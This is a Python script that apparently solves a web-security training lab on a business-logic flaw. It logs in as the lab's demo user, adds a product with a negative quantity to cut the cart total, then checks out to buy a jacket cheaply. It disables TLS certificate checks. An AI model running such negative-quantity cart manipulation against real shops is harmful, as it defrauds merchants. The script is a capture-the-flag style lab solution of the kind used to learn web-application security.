import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(session: requests.Session, url: str) -> str:
    response = session.get(url, verify = False)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, "html.parser")
    csrf_input = soup.find("input", {"name": "csrf"})
    if not csrf_input or not csrf_input.get("value"):
        raise RuntimeError(f"Could not find CSRF token on: {url}") 

    return csrf_input["value"] 

def buy_item(session : requests.Session, base_url: str) -> None:
    base_url = base_url.rstrip("/")
    # 1) Login
    login_url = f"{base_url}/login"
    csrf_token = get_csrf_token(session, login_url)

    print("(+) Logging in as the wiener user...")
    data_login = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    response = session.post(login_url, data= data_login, verify= False)
    response.raise_for_status()
    
    if  "Log out" not in response.text:
        print("(-) Could not login as wiener.")
        sys.exit(-1)
    print("(+) Successfully logged in as wiener.")

    # 2) Add negative items
    cart_url = f"{base_url}/cart"
    id = int(input("Enter id of product priced 94.50$: "))
    data_cart = {"productId": id, "redir": "PRODUCT", "quantity" :"-14"}
    response = session.post(cart_url, data=data_cart, verify=False)

    # 3) Add Jacket to cart
    cart_url = f"{base_url}/cart"
    data_cart = {"productId": "1", "redir": "PRODUCT", "quantity" :"1"}
    response = session.post(cart_url, data=data_cart, verify=False)

    # 4) Checkout
    checkout_url = f"{base_url}/cart/checkout"
    csrf_token = get_csrf_token(session, cart_url)
    data_checkout = {"csrf": csrf_token}
    response = session.post(checkout_url, data=data_checkout, verify=False)

    # 4) Check solved condition
    if "Congratulations" in response.text:
        print("(+) Successfully exploited the business logic vulnerability.")
    else:
        print("(-) Could not exploit the business logic vulnerability.")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage : {sys.argv[0]} <url>")
        sys.exit(-1)
    session = requests.Session()
    buy_item(session, sys.argv[1])

if __name__ == "__main__":
    main()
